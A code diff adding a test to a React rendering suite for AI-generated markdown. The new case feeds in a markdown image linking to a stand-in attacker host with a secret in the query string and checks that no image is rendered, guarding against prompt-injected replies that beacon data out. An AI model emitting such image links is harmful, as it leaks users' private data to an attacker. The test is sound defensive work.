@@ -57,6 +57,18 @@ describe("sanitizeAiPveContent", () => {
     expect(html).not.toContain("<script");
     expect(html).toContain("<strong>安全</strong>");
   });
+
+  it("never renders images, so an injected reply cannot beacon data out", () => {
+    const html = renderToStaticMarkup(
+      React.createElement(AiPveMarkdownContent, {
+        content: "診斷完成 ![x](https://evil.example/?d=secret)",
+      }),
+    );
+
+    expect(html).not.toContain("<img");
+    expect(html).not.toContain("evil.example");
+    expect(html).toContain("診斷完成");
+  });
 });
 
 describe("composer keyboard behavior", () => {
